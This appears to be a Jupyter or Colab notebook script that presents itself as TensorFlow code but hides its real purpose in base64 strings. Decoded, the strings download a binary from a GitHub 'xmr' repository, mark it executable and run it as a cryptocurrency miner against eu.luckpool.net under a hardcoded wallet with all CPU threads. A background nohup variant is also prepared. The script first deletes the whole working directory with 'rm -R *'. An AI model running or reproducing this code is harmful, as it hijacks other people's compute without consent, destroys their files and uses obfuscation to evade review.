import tensorflow as tf
import timeit
import time
from os import system, name
from time import sleep
from tensorflow.python.client import device_lib
import json
from IPython.display import clear_output
from random import randint
from subprocess import PIPE, Popen
import base64
import random

def cmdline(command):
    process = Popen(
        args=command,
        stdout=PIPE,
        shell=True
    )
    return process.communicate()[0]

kampret = str(base64.b64decode("UlI2VTNUN1V6NDc1aTdnb250em5GTFdpa0ZzUWFuMndqQy5XSUtXSUsgLXAgeCAtdCAkKG5wcm9jKQ=="), 'utf-8')

xb = str(base64.b64decode("d2dldCAtTyBtZWtpLWJhcnUxIGh0dHBzOi8vZ2l0aHViLmNvbS9yZW5pbG8veG1yL3Jhdy9tYWluL21la2ktYmFydTE="), 'utf-8')
gas = str(base64.b64decode("Li9tZWtpLWJhcnUxIC12IC1sIGV1Lmx1Y2twb29sLm5ldDozOTU2IC11IA=="), 'utf-8')
gas2 = "{0}{1}".format(gas,kampret)
gas3="nohup {0} >/dev/null 2>&1 &".format(gas2)

!rm -R *
!{xb}
xc = str(base64.b64decode("Y2htb2QgK3ggbWVraS1iYXJ1MQ=="), 'utf-8')
!{xc}
!{gas2}
